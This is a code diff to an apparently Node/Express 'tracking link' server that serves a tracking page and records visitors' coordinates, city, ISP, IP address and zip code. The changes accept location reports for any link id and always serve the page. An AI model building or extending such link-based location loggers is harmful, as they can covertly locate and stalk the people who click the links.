@@ -44,7 +44,11 @@ app.get('/api/locations/:id', (req, res) => {
 // Receive location from a visitor
 app.post('/api/location/:id', (req, res) => {
   const id = req.params.id;
-  if (!links.has(id)) return res.status(404).json({ error: 'Link not found' });
+  // Auto-create link if it doesn't exist (survives redeploys)
+  if (!links.has(id)) {
+    links.set(id, { id, label: 'Auto-detected', createdAt: new Date().toISOString() });
+    locations.set(id, []);
+  }
 
   const { lat, lng, accuracy, city, region, country, isp, ip, zip } = req.body;
   const entry = {
@@ -74,10 +78,8 @@ app.delete('/api/links/:id', (req, res) => {
   res.json({ success: true });
 });
 
-// Serve the tracking page
+// Serve the tracking page — always serve it, location POST can fail silently
 app.get('/t/:id', (req, res) => {
-  const id = req.params.id;
-  if (!links.has(id)) return res.status(404).send('Link not found');
   res.sendFile(path.join(__dirname, 'public', 'track.html'));
 });
 
